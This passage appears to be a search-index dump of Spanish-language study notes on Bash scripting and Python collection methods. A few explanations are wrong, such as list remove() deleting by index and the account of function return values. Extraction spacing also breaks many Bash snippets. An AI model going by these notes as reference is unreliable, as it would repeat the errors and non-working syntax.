$i mostrar 1 car\u00e1cter invertir cadena En cadenas es muy similar con la ventaja que no hay que indicar en que posici\u00f3n a\u00f1adir el item. l1 = \"hola\" invertida = \"\" for i in $( seq ${# l1 } -1 0 ) ; do invertida += ${ l1 : $i : 1 } done echo $invertida aloh ${#l1} numero del largo de la cadena ${l1:$i:1} slicing de posici\u00f3n de la vuelta $i mostrar 1 car\u00e1cter Funciones tabla (){ for variable in { 0 ..10 } do echo \" $variable * $1 = $(( variable* $1 )) \" done } case $1 in 1 ) tabla 5 ;; 2 ) tabla 6 ;; esac si dentro de la funci\u00f3n asignamos una variable con local num=2 no lo guarda al salir de la funci\u00f3n. suma (){ result = $(( $1 + $2 )) return $result } suma 10 20 echo $result ------- 30 para devolver un valor tenemos que utilizar return Modulo de funciones Para usar un modulo personalizado creamos un archivo con todas las funciones y lo exportamos al shell actual. funciones.sh #!/bin/bash # modulo funcions # ---------------------------- function hola (){ echo \"hola, bon dia\" return 0 } function suma (){ echo $(( $1 + $2 )) return 0 } Exporto el archivo funciones con \" . \", una vez exportado puedo utilizar sus funciones en el shell. debian \u279c . ./funciones.sh debian \u279c hola hola debian \u279c suma 5 5 10 Getops getops crea un men\u00fa de opciones a pasar a un script, indicando por argumento la opci\u00f3n requerida ca ejecutar getops.sh while getopts \"hct:\" opcion do case $opcion in h ) echo \"ayuda de como usar\" ;; c ) echo \"actuaremos\" ;; t ) fichero = \" $OPTARG \" ;; * ) echo \"no has usado bien el script\" ;; esac done Si en las opciones colocas letras + \u201c:\u201d Le indicas que a\u00f1ades un argumento que luego puedes usar con: $OPTARG bash getops.sh -h ayuda de como usar","title":"Shell"},{"location":"lenguajes/Shell/#shell","text":"orden && orden and : si va bien la primera orden ara la segunda. orden || orden or : si no va bien la primera ejecuta la segunta","title":"Shell"},{"location":"lenguajes/Shell/#comand-substitution","text":"Ejecutar una orden para ser ejecutada por otra orden: file $(ls) Ejemplo: - finger $(whoami) rpm -ql $(rpm -qf $( which $orden ) ) Primero se ejecuta orden Segundo which Tercero rpm queri file con todo el resultado cuarto rpm queri list","title":"Comand substitution"},{"location":"lenguajes/Shell/#brace-expansion","text":"Sintaxis echo nom { 1 ,2,3 } # crea 3 resultado acabados en 1 2 3 echo nom { 1 ..10 } # crea 10 resultados acavados del 1 al 10 echo nom { 1 ,2, { 30 ..35 } ,hola } # crea resultado acabados en 1 2 hola y u rango de 30 al 35 echo nom { 1 ,2, { a..h }} # crea resultado acabados en 1 2 y un rango de a, a la h echo nom { 1 ,2,3 } nom1 nom2 nom3","title":"Brace Expansion"},{"location":"lenguajes/Shell/#aritmetic-expansion","text":"Calculos matematicos echo $(( 2 * 4 )) 8 max = 30 echo $(( 365 - $max )) 335","title":"Aritmetic expansion"},{"location":"lenguajes/Shell/#tilde-expansion","text":"~ El home de usuario actual ~root El home de usuario indicado","title":"Tilde expansion"},{"location":"lenguajes/Shell/#quoting","text":"\"\" expansion '' literal \\ escapar caracteres de significado especial ( por ejemplo espacios, comillas, etc..","title":"Quoting"},{"location":"lenguajes/Shell/#ordenes","text":"Que pasa al apretar enter. Expansion / interpretaci\u00f3n Ejecuci\u00f3n alias internas externas ( path ) Si la expansi\u00f3n falla la ejecuci\u00f3n no ejecuta. rm * - Primero interpreta el asterisco con todos los archivos del directorio - Despues los pasa al rm para que procese.","title":"Ordenes"},{"location":"lenguajes/Shell/#internas-externas","text":"Ordenes externas son las que tienen ruta en el PATH. Ordenes internas son las ordenes del sistema. enable -a # mirar internas enable -n logout # deshabilitar interna enable logout # volver a habilitar","title":"Internas Externas"},{"location":"lenguajes/Shell/#rpm","text":"Ver paquete de un fichero: rpm -qf /usr/bin/ps ver contenido del paquete rpl -ql paquete","title":"rpm"},{"location":"lenguajes/Shell/#bash-scripting","text":"","title":"Bash Scripting"},{"location":"lenguajes/Shell/#estructura-de-un-script","text":"La primera l\u00ednea de un script siempre sera, que tipo de c\u00f3digo lo interpreta, a esta l\u00ednea se le denomina: shebang #!/bin/bash","title":"Estructura de un script"},{"location":"lenguajes/Shell/#ejecutar","text":"bash prog.sh # si tiene permisos de ejecuci\u00f3n, ejecuta y mata shell . ./prog.sh bash ejecuta en un subproceso . ejecuta el programa y mata la shell","title":"ejecutar"},{"location":"lenguajes/Shell/#argumentos","text":"$# # numero total de argumentos $* # lista de argumentos $@ # lista de argumentos # argumento numero tal $0 $1 $2 $3 ${ 10 } La diferencia entre $* y $@ es que al encapsular-los entre \"\" , \"$*\" ignora los espacios entre argumentos y lo muestra como uno, y \"$@\" representa cada espacio como argumento separado. -e interpretar expansiones tipo \\n \\t etc... -n salida sin salto de linea. los programas de administraci\u00f3n no seran interactivos.","title":"Argumentos"},{"location":"lenguajes/Shell/#test","text":"Test cheque tipo de archivos y compara valores. todas sus opciones en man test # algunas de sus opciones para ficheros -L es link -f fichers regulares -d directorio -e existe -o dispositivo de bloques -x archivo ejecutable -w permisos de escritura -r permisos de lectura -n not null # en cadenas -n \"algo\" cadena no vacia true -z \"\" cadena vacia true = iguales ! = diferentes = ~ conpara con expresion regular # comparadores numericos -gt > -lt < -ge > = -le < = -eq == -ne ! = -a and -o or ! not # operadores aritmeticos + suma - resta \\* multiplicar / dividir % modulo ( resto ) La condici\u00f3n realmente ejecuta un test, que devuelve true o false. sintaxis: test $n -lt 18 [ $n -lt 18 ] test se a actualizado y trae algunas funcionalidades extra, como: # si un archivo tiene espacios en su nombre if [ -f \" $file \" ] if [[ -f $file ]] # aceptar expresiones regulares if [ \" $answer \" = y -o \" $answer \" = yes ] if [[ $answer = ~ ^y ( es ) ?$ ]] # acepta parentesis y las expresiones && || ! [ 5 -lt 7 -a ! 5 -gt 7 ] [[ 5 -lt 7 && ! ( 5 -gt 7 ) ]] # permite comparar texto segun su numero asci [[ \"a\" < \"z\" ]]","title":"Test"},{"location":"lenguajes/Shell/#condicionales","text":"Sentencia if if [ $edad -ge 18 ] then echo \"Mayor de edad\" else echo \"Menor de edad\" fi Sentencia elif if [ $edad -lt 18 ] then echo \"Menor edad\" elif [ $edad -lt 65 ] then echo \"Edad laboral\" else echo \"jubilat\" fi Prohibido repetir la misma instrucci\u00f3n dentro de if, elif, else, etc.. a no se que sea absolutamiento necesario.","title":"Condicionales"},{"location":"lenguajes/Shell/#case","text":"Case evalua valores lletra = $1 case $lletra in 'a' | 'e' | 'i' | 'o' | 'u' ) echo \" $lletra es una vocal\" ;; * ) echo \" $lletra es una constant\" ;; esac exit 0 indicas los valores a evaluar y si no existe el * es el comod\u00edn, como si fuera un else.","title":"Case"},{"location":"lenguajes/Shell/#bucles","text":"","title":"Bucles"},{"location":"lenguajes/Shell/#for","text":"Itera per a cada element d'una llista finita hay errores irrecuperables y recuperables las irrecuperables -- plegas las recuperables -- continuar pero: 1 informando que se a generado un error por stderr $? status error final especifico # coge la lista como 1 elemento al insertar la variable entre \"\" llista = \"per pau edu anna\" for nom in \" $llista \" do echo $nom done # diferencia cada nombre por separado llista = \"per pau edu anna\" for nom in $llista do echo $nom done for i in $( seq 1 1 5 ) ; # ( inicio incremento final ) do echo $i done for (( i = 0 ; i < = 5 ; i++ )) # ( inicio ; final ; incremento ) do echo \" $i \" done Listando tipos de ficheros: dirs = $* for dir in $dirs do if ! [ -d $dir ] then echo \"Error: el argument a de ser un directori\" >> /dev/stderr echo \"Usage: prog dir[...]\" >> /dev/stderr else cont = 1 llistatDir = $( ls $dir ) for line in $llistatDir do line = $( echo $dir / $line | tr -s '/' '/' ) if [ -L $line ] then tipus = \"Link\" elif [ -d $line ] then tipus = \"Directori\" elif [ -f $line ] then tipus = \"Fitxer\" else tipus = \"Otra cosa\" fi echo \" $cont : $tipus : $line \" cont = $(( cont+1 )) done fi done","title":"for"},{"location":"lenguajes/Shell/#while","text":"CONTADOR = 0 while [ $CONTADOR -lt 5 ] ; do echo El contador es $CONTADOR let CONTADOR++ done # leer lineas por entrada estandar hasta que encuentre FI read -r line while [ $line ! = \"FI\" ] do echo \" $line \" read -r line done exit 0 # ller lineas por entrada estandar y numerarlas cont = 1 while read -r line do echo \" $cont : $line \" cont = $(( cont+1 )) done exit 0 leer linea por entrada estandar o argumento # bash iterar.sh noms.txt # cat noms.txt | bash iterar.sh # bash iterar.sh < noms.txt file = /dev/stdin if [ $# -eq 1 ] ; then file = $1 fi cont = 0 while read -r line do let cont++ echo \" $cont $line \" # redirijo stdin o el argumento dentro del while done < $file exit 0","title":"while"},{"location":"lenguajes/Shell/#shift","text":"shift (desplazar) los argumentos una posici\u00f3n a la izquierda, el argumento en primera posici\u00f3n al hacer shift desaparecer\u00e1 y el 2 estar\u00e1 en la posici\u00f3n 1. los argumentos los trata como una cadena por lo tanto hay que encapsular-los con \"\" para su correcto funcionamiento. # -n not null while [ -n \" $1 \" ] do echo \" $# : $1 \" shift done exit 0","title":"Shift"},{"location":"lenguajes/Shell/#listas","text":"contar caracteres ${#variable} lista =( 2 8 5 7 6 ) echo ${ lista [@] } 2 8 5 7 6 # muestra lista completa echo ${ lista [2] } 5 # muestra el item de la posici\u00f3n 2 echo ${# lista [@] } 5 # items dentro de la lista echo ${ !lista[@] } 0 1 2 3 4 # posiciones de la lista ocupadas","title":"Listas"},{"location":"lenguajes/Shell/#slicing","text":"echo ${ lista [@]: 2 } 5 7 6 # muestra de posici\u00f3n 2 hasta el final echo ${ lista [@]: 1 : 2 } 8 5 # muestra desde la posici\u00f3n 1 dos n\u00fameros","title":"Slicing"},{"location":"lenguajes/Shell/#sustituir","text":"lista =( uno dos tres cuatro ) echo ${ lista [@]#c*o } uno dos tres # borra lo que comienza por c cualquier cosa y o echo ${ lista [@]/cua/CUA } uno dos tres CUAtro # substitulle echo ${ lista [@]//ua/UA } # con 2 // lo hace recursivamente uno dos tres cUAtro # substituye echo ${ lista [@]/%o/XX } unXX dos tres cuatrXX # substituye lo que acaba en o","title":"Sustituir"},{"location":"lenguajes/Shell/#anadir-items","text":"lista =( uno dos tres ) lista [ 3 ]= cuatro echo ${ lista [@] } uno dos tres cuatro lista [ ${# lista [@] } ]= \u201dalgo\u201d # a\u00f1ade al final de la lista echo ${ lista [@] } uno dos tres cuatro algo","title":"A\u00f1adir items"},{"location":"lenguajes/Shell/#quitar-item","text":"lista =( uno dos tres ) unset lista [ 2 ] echo ${ lista [@] } uno dos","title":"Quitar item"},{"location":"lenguajes/Shell/#invertir-lista","text":"l1 =( \"h\" \"o\" \"l\" \"a\" ) invertida =() for i in $( seq ${# l1 [*] } -1 0 ) ; do invertida [ ${# invertida [*] } ]= ${ l1 [*]: $i : 1 } done echo ${ invertida [*] } invertida[${#invertida[*]}]=${l1[*]:$i:1} ${#invertida[*]} Extrae el n\u00famero de items dentro de la lista, para asignar siempre en la ultima posici\u00f3n. ${l1[*]:$i:1} slicing de posici\u00f3n de la vuelta $i mostrar 1 car\u00e1cter","title":"Invertir lista"},{"location":"lenguajes/Shell/#invertir-cadena","text":"En cadenas es muy similar con la ventaja que no hay que indicar en que posici\u00f3n a\u00f1adir el item. l1 = \"hola\" invertida = \"\" for i in $( seq ${# l1 } -1 0 ) ; do invertida += ${ l1 : $i : 1 } done echo $invertida aloh ${#l1} numero del largo de la cadena ${l1:$i:1} slicing de posici\u00f3n de la vuelta $i mostrar 1 car\u00e1cter","title":"invertir cadena"},{"location":"lenguajes/Shell/#funciones","text":"tabla (){ for variable in { 0 ..10 } do echo \" $variable * $1 = $(( variable* $1 )) \" done } case $1 in 1 ) tabla 5 ;; 2 ) tabla 6 ;; esac si dentro de la funci\u00f3n asignamos una variable con local num=2 no lo guarda al salir de la funci\u00f3n. suma (){ result = $(( $1 + $2 )) return $result } suma 10 20 echo $result ------- 30 para devolver un valor tenemos que utilizar return","title":"Funciones"},{"location":"lenguajes/Shell/#modulo-de-funciones","text":"Para usar un modulo personalizado creamos un archivo con todas las funciones y lo exportamos al shell actual. funciones.sh #!/bin/bash # modulo funcions # ---------------------------- function hola (){ echo \"hola, bon dia\" return 0 } function suma (){ echo $(( $1 + $2 )) return 0 } Exporto el archivo funciones con \" . \", una vez exportado puedo utilizar sus funciones en el shell. debian \u279c . ./funciones.sh debian \u279c hola hola debian \u279c suma 5 5 10","title":"Modulo de funciones"},{"location":"lenguajes/Shell/#getops","text":"getops crea un men\u00fa de opciones a pasar a un script, indicando por argumento la opci\u00f3n requerida ca ejecutar getops.sh while getopts \"hct:\" opcion do case $opcion in h ) echo \"ayuda de como usar\" ;; c ) echo \"actuaremos\" ;; t ) fichero = \" $OPTARG \" ;; * ) echo \"no has usado bien el script\" ;; esac done Si en las opciones colocas letras + \u201c:\u201d Le indicas que a\u00f1ades un argumento que luego puedes usar con: $OPTARG bash getops.sh -h ayuda de como usar","title":"Getops"},{"location":"lenguajes/python3/Apuntes-Metodos/","text":"M\u00e9todos de colecciones M\u00e9todos de las cadenas upper(): Devuelve la cadena con todos sus caracteres a may\u00fascula \"Hola Mundo\" . upper () 'HOLA MUNDO' lower(): Devuelve la cadena con todos sus caracteres a min\u00fascula \"Hola Mundo\" . lower () 'hola mundo' capitalize(): Devuelve la cadena con su primer car\u00e1cter en may\u00fascula \"hola mundo\" . capitalize () 'Hola mundo' title(): Devuelve la cadena con el primer car\u00e1cter de cada palabra en may\u00fascula \"hola mundo\" . title () 'Hola Mundo' count(): Devuelve una cuenta de las veces que aparece una subcadena en la cadena \"Hola mundo\" . count ( 'mundo' ) 1 find(): Devuelve el \u00edndice en el que aparece la subcadena (-1 si no aparece) \"Hola mundo\" . find ( 'mundo' ) 5 \"Hola mundo\" . find ( 'mundoz' ) -1 rfind(): Devuelve el \u00edndice en el que aparece la subcadena, empezando por el final \"Hola mundo mundo mundo\" . rfind ( 'mundo' ) 17 isdigit(): Devuelve True si la cadena es todo n\u00fameros (False en caso contrario) c = \"100\" c . isdigit () True isalnum(): Devuelve True si la cadena es todo n\u00fameros o car\u00e1cteres alfab\u00e9ticos c2 = \"ABC10034po\" c2 . isalnum () True isalpha(): Devuelve True si la cadena es todo car\u00e1cteres alfab\u00e9ticos c2 . isalpha () False \"Holamundo\" . isalpha () True islower(): Devuelve True si la cadena es todo min\u00fasculas \"Hola mundo\" . islower () False isupper(): Devuelve True si la cadena es todo may\u00fasculas \"Hola mundo\" . isupper () False istitle(): Devuelve True si la primera letra de cada palabra es may\u00fascula \"Hola Mundo\" . istitle () True isspace(): Devuelve True si la cadena es todo espacios \" - \" . isspace () False startswith(): Devuelve True si la cadena empieza con una subcadena \"Hola mundo\" . startswith ( \"Mola\" ) False endswith(): Devuelve True si la cadena acaba con una subcadena \"Hola mundo\" . endswith ( 'mundo' ) True split(): Separa la cadena en subcadenas a partir de sus espacios y devuelve una lista \"Hola mundo mundo\" . split ()[ 0 ] 'Hola' Podemos indicar el car\u00e1cter a partir del que se separa: \"Hola,mundo,mundo,otra,palabra\" . split ( ',' ) ['Hola', 'mundo', 'mundo', 'otra', 'palabra'] join(): Une todos los caracteres de una cadena utilizando un caracter de uni\u00f3n \",\" . join ( \"Hola mundo\" ) 'H,o,l,a, ,m,u,n,d,o' \" \" . join ( \"Hola\" ) 'H o l a' strip(): Borra todos los espacios por delante y detr\u00e1s de una cadena y la devuelve \" Hola mundo \" . strip () 'Hola mundo' Podemos indicar el car\u00e1cter a borrar: \"-----Hola mundo---\" . strip ( '-' ) 'Hola mundo' replace(): Reemplaza una subcadena de una cadena por otra y la devuelve \"Hola mundo\" . replace ( 'o' , '0' ) 'H0la mund0' Podemos indicar un l\u00edmite de veces a reemplazar: \"Hola mundo mundo mundo mundo mundo\" . replace ( ' mundo' , '' , 4 ) 'Hola mundo' M\u00e9todos de las listas append(): A\u00f1ade un \u00edtem al final de la lista lista = [ 1 , 2 , 3 , 4 , 5 ] lista . append ( 6 ) clear(): Vac\u00eda todos los \u00edtems de una lista print ( lista ) [1, 2, 3, 4, 5, 6] lista . clear () print ( lista ) [] extend(): Une una lista a otra l1 = [ 1 , 2 , 3 ] l2 = [ 4 , 5 , 6 ] l1 . extend ( l2 ) count(): Cuenta el n\u00famero de veces que aparece un \u00edtem l1 [1, 2, 3, 4, 5, 6] [ \"Hola\" , \"mundo\" , \"mundo\" ] . count ( \"Hola\" ) 1 index(): Devuelve el \u00edndice en el que aparece un \u00edtem (error si no aparece) [ \"Hola\" , \"mundo\" , \"mundo\" ] . index ( \"mundo\" ) 1 [ \"Hola\" , \"mundo\" , \"mundo\" ] . index ( \"mundoz\" ) --------------------------------------------------------------------------- ValueError Traceback (most recent call last) <ipython-input-1-3c3755903d17> in <module>() ----> 1 [\"Hola\", \"mundo\", \"mundo\"].index(\"mundoz\") ValueError: 'mundoz' is not in list insert(indice, valor): Agrega un \u00edtem a la lista en un \u00edndice espec\u00edfico. Primera posici\u00f3n (0) l = [ 1 , 2 , 3 ] l . insert ( 0 , 0 ) print ( l ) [0, 1, 2, 3] Pen\u00faltima posici\u00f3n (-1) l = [ 5 , 10 , 15 , 25 ] l . insert ( - 1 , 20 ) print ( l ) [5, 10, 15, 20, 25] \u00daltima posici\u00f3n en una lista (podemos utilizar len) n = len ( l ) l . insert ( n , 30 ) print ( l ) [5, 10, 15, 20, 25, 30] Una posici\u00f3n fuera de rango (999) l . insert ( 20 , 999 ) print ( l ) [5, 10, 15, 20, 25, 30, 999] pop(): Extrae un \u00edtem de la lista y lo borra l = [ 10 , 20 , 30 , 40 , 50 ] l . pop () 50 print ( l ) [10, 20, 30, 40] Podemos indicarle un \u00edndice con el elemento a sacar (0 es el primer \u00edtem) l . pop ( 0 ) 10 print ( l ) [20, 30, 40] remove(): Borra un \u00edtem de la lista directamente a partir del \u00edndice l . remove ( 30 ) print ( l ) [20, 40] l = [ 20 , 30 , 30 , 30 , 40 ] l . remove ( 30 ) print ( l ) [20, 30, 30, 40] reverse(): Le da la vuelta a la lista actual l . reverse () print ( l ) [40, 30, 30, 20] Las cadenas no tienen el m\u00e9todo .reverse() pero podemos simularlo haciendo unas conversiones... \"Hola mundo\" . reverse () --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) <ipython-input-58-eb5308f434bf> in <module>() ----> 1 \"Hola mundo\".reverse() AttributeError: 'str' object has no attribute 'reverse' lista = list ( \"Hola mundo\" ) lista ['H', 'o', 'l', 'a', ' ', 'm', 'u', 'n', 'd', 'o'] lista . reverse () lista ['o', 'd', 'n', 'u', 'm', ' ', 'a', 'l', 'o', 'H'] cadena = \"\" . join ( lista ) cadena 'odnum aloH' sort(): Ordena autom\u00e1ticamente los \u00edtems de una lista por su valor de menor a mayor lista = [ 5 , - 10 , 35 , 0 , - 65 , 100 ] lista . sort () lista [-65, -10, 0, 5, 35, 100] Podemos utilizar el argumento reverse=True para indicar que la ordene del rev\u00e9s lista . sort ( reverse = True ) lista [100, 35, 5, 0, -10, -65] M\u00e9todos de los conjuntos c = set () add(): A\u00f1ade un \u00edtem a un conjunto, si ya existe no lo a\u00f1ade c . add ( 1 ) c . add ( 2 ) c . add ( 3 ) print ( c ) {1, 2, 3} discard(): Borra un \u00edtem de un conjunto c . discard ( 1 ) print ( c ) {2, 3} Cuando creas una copia realmente es un enlace directo c . add ( 1 ) c2 = c c2 . add ( 4 ) print ( c ) {1, 2, 3, 4} copy(): Crea una copia de un conjunto Recordad que los tipos compuestos no se pueden copiar, son como accesos directos por referencia c2 = c . copy () print ( c2 ) {1, 2, 3, 4} print ( c ) {1, 2, 3, 4} c2 . discard ( 4 ) print ( c2 ) {1, 2, 3} print ( c ) {1, 2, 3, 4} clear(): Borra todos los \u00edtems de un conjunto c2 . clear () c2 set() Comparaci\u00f3n de conjuntos c1 = { 1 , 2 , 3 } c2 = { 3 , 4 , 5 } c3 = { - 1 , 99 } c4 = { 1 , 2 , 3 , 4 , 5 } isdisjoint(): Comprueba si el conjunto es disjunto de otro conjunto Si no hay ning\u00fan elemento en com\u00fan entre ellos c1 . isdisjoint ( c2 ) False issubset(): Comprueba si el conjunto es subconjunto de otro conjunto Si sus \u00edtems se encuentran todos dentro de otro c3 . issubset ( c4 ) False issuperset(): Comprueba si el conjunto es contenedor de otro subconjunto Si contiene todos los \u00edtems de otro c3 . issuperset ( c1 ) False M\u00e9todos avanzados Se utilizan para realizar uniones, diferencias y otras operaciones avanzadas entre conjuntos. Suelen tener dos formas, la normal que devuelve el resultado, y otra que hace lo mismo pero actualiza el propio resultado. c1 = { 1 , 2 , 3 } c2 = { 3 , 4 , 5 } c3 = { - 1 , 99 } c4 = { 1 , 2 , 3 , 4 , 5 } union(): Une un conjunto a otro y devuelve el resultado en un nuevo conjunto c1 . union ( c2 ) == c4 True c1 . union ( c2 ) {1, 2, 3, 4, 5} print ( c1 ) {1, 2, 3} print ( c2 ) {3, 4, 5} update(): Une un conjunto a otro en el propio conjunto c1 . update ( c2 ) print ( c1 ) {1, 2, 3, 4, 5} difference(): Encuentra los elementos no comunes entre dos conjuntos c1 = { 1 , 2 , 3 } c2 = { 3 , 4 , 5 } c3 = { - 1 , 99 } c4 = { 1 , 2 , 3 , 4 , 5 } c1 . difference ( c2 ) {1, 2} difference_update(): Guarda en el conjunto los elementos no comunes entre dos conjuntos c1 . difference_update ( c2 ) print ( c1 ) {1, 2} intersection(): Devuelve un conjunto con los elementos comunes en dos conjuntos c1 = { 1 , 2 , 3 } c2 = { 3 , 4 , 5 } c3 = { - 1 , 99 } c4 = { 1 , 2 , 3 , 4 , 5 } c1 . intersection ( c2 ) {3} intersection_update(): Guarda en el conjunto los elementos comunes entre dos conjuntos c1 . intersection_update ( c2 ) c1 {3} symmetric_difference(): Devuelve los elementos sim\u00e9tricamente diferentes entre dos conjuntos Todos los elementos que no concuerdan entre los dos conjuntos c1 = { 1 , 2 , 3 } c2 = { 3 , 4 , 5 } c3 = { - 1 , 99 } c4 = { 1 , 2 , 3 , 4 , 5 } c1 . symmetric_difference ( c2 ) {1, 2, 4, 5} M\u00e9todos de los diccionarios colores = { \"amarillo\" : \"yellow\" , \"azul\" : \"blue\" , \"verde\" : \"green\" } colores [ 'amarillo' ] 'yellow' get(): Busca un elemento a partir de su clave y si no lo encuentra devuelve un valor por defecto colores . get ( 'negro' , 'no se encuentra' ) 'no se encuentra' 'amarillo' in colores True keys(): Genera una lista en clave de los registros del diccionario colores . keys () dict_keys(['amarillo', 'azul', 'verde']) values(): Genera una lista en valor de los registros del diccionario colores . values () dict_values(['yellow', 'blue', 'green']) items(): Genera una lista en clave-valor de los registros del diccionario colores . items () dict_items([('amarillo', 'yellow'), ('azul', 'blue'), ('verde', 'green')]) for c in colores : print ( colores [ c ]) yellow blue green for c , v in colores . items (): print ( c , v ) # clave, valor amarillo yellow azul blue verde green pop(): Extrae un registro de un diccionario a partir de su clave y lo borra, acepta valor por defecto colores . pop ( \"amarillo\" , \"no se ha encontrado\" ) 'yellow' print ( colores ) {'azul': 'blue', 'verde': 'green'} colores . pop ( \"negro\" , \"no se ha encontrado\" ) 'no se ha encontrado' print ( colores ) {'azul': 'blue', 'verde': 'green'} clear(): Borra todos los registros de un diccionario colores . clear () print ( colores ) {}","title":"M\u00e9todos de colecciones"},{"location":"lenguajes/python3/Apuntes-Metodos/#metodos-de-colecciones","text":"","title":"M\u00e9todos de colecciones"},{"location":"lenguajes/python3/Apuntes-Metodos/#metodos-de-las-cadenas","text":"","title":"M\u00e9todos de las cadenas"},{"location":"lenguajes/python3/Apuntes-Metodos/#upper","text":"Devuelve la cadena con todos sus caracteres a may\u00fascula \"Hola Mundo\" . upper () 'HOLA MUNDO'","title":"upper():"},{"location":"lenguajes/python3/Apuntes-Metodos/#lower","text":"Devuelve la cadena con todos sus caracteres a min\u00fascula \"Hola Mundo\" . lower () 'hola mundo'","title":"lower():"},{"location":"lenguajes/python3/Apuntes-Metodos/#capitalize","text":"Devuelve la cadena con su primer car\u00e1cter en may\u00fascula \"hola mundo\" . capitalize () 'Hola mundo'","title":"capitalize():"},{"location":"lenguajes/python3/Apuntes-Metodos/#title","text":"Devuelve la cadena con el primer car\u00e1cter de cada palabra en may\u00fascula \"hola mundo\" . title () 'Hola Mundo'","title":"title():"},{"location":"lenguajes/python3/Apuntes-Metodos/#count","text":"Devuelve una cuenta de las veces que aparece una subcadena en la cadena \"Hola mundo\" . count ( 'mundo' ) 1","title":"count():"},{"location":"lenguajes/python3/Apuntes-Metodos/#find","text":"Devuelve el \u00edndice en el que aparece la subcadena (-1 si no aparece) \"Hola mundo\" . find ( 'mundo' ) 5 \"Hola mundo\" . find ( 'mundoz' ) -1","title":"find():"},{"location":"lenguajes/python3/Apuntes-Metodos/#rfind","text":"Devuelve el \u00edndice en el que aparece la subcadena, empezando por el final \"Hola mundo mundo mundo\" . rfind ( 'mundo' ) 17","title":"rfind():"},{"location":"lenguajes/python3/Apuntes-Metodos/#isdigit","text":"Devuelve True si la cadena es todo n\u00fameros (False en caso contrario) c = \"100\" c . isdigit () True","title":"isdigit():"},{"location":"lenguajes/python3/Apuntes-Metodos/#isalnum","text":"Devuelve True si la cadena es todo n\u00fameros o car\u00e1cteres alfab\u00e9ticos c2 = \"ABC10034po\" c2 . isalnum () True","title":"isalnum():"},{"location":"lenguajes/python3/Apuntes-Metodos/#isalpha","text":"Devuelve True si la cadena es todo car\u00e1cteres alfab\u00e9ticos c2 . isalpha () False \"Holamundo\" . isalpha () True","title":"isalpha():"},{"location":"lenguajes/python3/Apuntes-Metodos/#islower","text":"Devuelve True si la cadena es todo min\u00fasculas \"Hola mundo\" . islower () False","title":"islower():"},{"location":"lenguajes/python3/Apuntes-Metodos/#isupper","text":"Devuelve True si la cadena es todo may\u00fasculas \"Hola mundo\" . isupper () False","title":"isupper():"},{"location":"lenguajes/python3/Apuntes-Metodos/#istitle","text":"Devuelve True si la primera letra de cada palabra es may\u00fascula \"Hola Mundo\" . istitle () True","title":"istitle():"},{"location":"lenguajes/python3/Apuntes-Metodos/#isspace","text":"Devuelve True si la cadena es todo espacios \" - \" . isspace () False","title":"isspace():"},{"location":"lenguajes/python3/Apuntes-Metodos/#startswith","text":"Devuelve True si la cadena empieza con una subcadena \"Hola mundo\" . startswith ( \"Mola\" ) False","title":"startswith():"},{"location":"lenguajes/python3/Apuntes-Metodos/#endswith","text":"Devuelve True si la cadena acaba con una subcadena \"Hola mundo\" . endswith ( 'mundo' ) True","title":"endswith():"},{"location":"lenguajes/python3/Apuntes-Metodos/#split","text":"Separa la cadena en subcadenas a partir de sus espacios y devuelve una lista \"Hola mundo mundo\" . split ()[ 0 ] 'Hola' Podemos indicar el car\u00e1cter a partir del que se separa: \"Hola,mundo,mundo,otra,palabra\" . split ( ',' ) ['Hola', 'mundo', 'mundo', 'otra', 'palabra']","title":"split():"},{"location":"lenguajes/python3/Apuntes-Metodos/#join","text":"Une todos los caracteres de una cadena utilizando un caracter de uni\u00f3n \",\" . join ( \"Hola mundo\" ) 'H,o,l,a, ,m,u,n,d,o' \" \" . join ( \"Hola\" ) 'H o l a'","title":"join():"},{"location":"lenguajes/python3/Apuntes-Metodos/#strip","text":"Borra todos los espacios por delante y detr\u00e1s de una cadena y la devuelve \" Hola mundo \" . strip () 'Hola mundo' Podemos indicar el car\u00e1cter a borrar: \"-----Hola mundo---\" . strip ( '-' ) 'Hola mundo'","title":"strip():"},{"location":"lenguajes/python3/Apuntes-Metodos/#replace","text":"Reemplaza una subcadena de una cadena por otra y la devuelve \"Hola mundo\" . replace ( 'o' , '0' ) 'H0la mund0' Podemos indicar un l\u00edmite de veces a reemplazar: \"Hola mundo mundo mundo mundo mundo\" . replace ( ' mundo' , '' , 4 ) 'Hola mundo'","title":"replace():"},{"location":"lenguajes/python3/Apuntes-Metodos/#metodos-de-las-listas","text":"","title":"M\u00e9todos de las listas"},{"location":"lenguajes/python3/Apuntes-Metodos/#append","text":"A\u00f1ade un \u00edtem al final de la lista lista = [ 1 , 2 , 3 , 4 , 5 ] lista . append ( 6 )","title":"append():"},{"location":"lenguajes/python3/Apuntes-Metodos/#clear","text":"Vac\u00eda todos los \u00edtems de una lista print ( lista ) [1, 2, 3, 4, 5, 6] lista . clear () print ( lista ) []","title":"clear():"},{"location":"lenguajes/python3/Apuntes-Metodos/#extend","text":"Une una lista a otra l1 = [ 1 , 2 , 3 ] l2 = [ 4 , 5 , 6 ] l1 . extend ( l2 )","title":"extend():"},{"location":"lenguajes/python3/Apuntes-Metodos/#count_1","text":"Cuenta el n\u00famero de veces que aparece un \u00edtem l1 [1, 2, 3, 4, 5, 6] [ \"Hola\" , \"mundo\" , \"mundo\" ] . count ( \"Hola\" ) 1","title":"count():"},{"location":"lenguajes/python3/Apuntes-Metodos/#index","text":"Devuelve el \u00edndice en el que aparece un \u00edtem (error si no aparece) [ \"Hola\" , \"mundo\" , \"mundo\" ] . index ( \"mundo\" ) 1 [ \"Hola\" , \"mundo\" , \"mundo\" ] . index ( \"mundoz\" ) --------------------------------------------------------------------------- ValueError Traceback (most recent call last) <ipython-input-1-3c3755903d17> in <module>() ----> 1 [\"Hola\", \"mundo\", \"mundo\"].index(\"mundoz\") ValueError: 'mundoz' is not in list","title":"index():"},{"location":"lenguajes/python3/Apuntes-Metodos/#insertindice-valor","text":"Agrega un \u00edtem a la lista en un \u00edndice espec\u00edfico. Primera posici\u00f3n (0) l = [ 1 , 2 , 3 ] l . insert ( 0 , 0 ) print ( l ) [0, 1, 2, 3] Pen\u00faltima posici\u00f3n (-1) l = [ 5 , 10 , 15 , 25 ] l . insert ( - 1 , 20 ) print ( l ) [5, 10, 15, 20, 25] \u00daltima posici\u00f3n en una lista (podemos utilizar len) n = len ( l ) l . insert ( n , 30 ) print ( l ) [5, 10, 15, 20, 25, 30] Una posici\u00f3n fuera de rango (999) l . insert ( 20 , 999 ) print ( l ) [5, 10, 15, 20, 25, 30, 999]","title":"insert(indice, 